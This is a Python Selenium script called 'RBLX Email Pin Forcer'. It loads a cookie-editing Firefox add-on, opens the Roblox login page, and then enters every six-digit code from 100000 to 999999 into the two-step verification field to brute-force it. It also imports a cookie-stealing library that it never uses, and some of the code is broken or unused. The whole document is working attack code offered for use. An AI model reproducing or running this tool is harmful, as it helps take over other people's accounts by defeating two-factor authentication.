import browser_cookie3, requests, threading
import os
from os import path
from selenium import *
from selenium import webdriver
from selenium.webdriver.common.by import By
from art import *
from ffext import *
from time import sleep

def clear():
    os.system('cls')

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def error():
    print(bcolors.OKBLUE + '[' + bcolors.FAIL+ 'X' + bcolors.OKBLUE + '] ERROR! - Trying again')

def pause():
    os.system('pause')

def banner():
    print(bcolors.OKCYAN + ' ')
    tprint('Email Pin')
    tprint('Forcer')
    print(' ')
    print(bcolors.ENDC + 'by - ' + bcolors.OKGREEN + 'Kolhax' + bcolors.ENDC + ' ')
    print(' ')

clear()
os.system('title RBLX Email Pin Forcer')


driver = webdriver.Firefox()
print('Loading...')

path = os.getcwd()
extension_path = path + "\editcookie.xpi"
driver.install_addon(extension_path, temporary=True)
driver.get("about:support")
addons = driver.find_element_by_xpath('//*[contains(text(),"Add-ons") and not(contains(text(),"with"))]')
driver.execute_script("arguments[0].scrollIntoView();", addons)
time.sleep(10)
addons1 = driver.find_elements_by_xpath('//*[contains(text(),"Add-ons") and not(contains(text(),"with"))]/following-sibling::*[1]/*[2]/*/*[1]')
 
# a list is created to return names of all the installed addons
addonsList = []
for addon in addons1:
    addonsList.append(addon.text)

driver.get('https://roblox.com/login')
os.system('cls')
print('Login to roblox and press anykey when you are on the pin page')
os.system('pause')
x = 100000
while x <= 999999 :
    while True:
        try:
            driver.find_element(By.ID, "two-step-verification-code-input").clear()
            driver.find_element(By.ID, "two-step-verification-code-input").send_keys(str(x))
            driver.find_element(By.XPATH, "/html/body/div[17]/div[2]/div/div/div[3]/button").click()
        except:
            continue
        break
    print(f"tried: {x}")
    x = x + 1
print('pass not found, SOrry')
os.system('pause')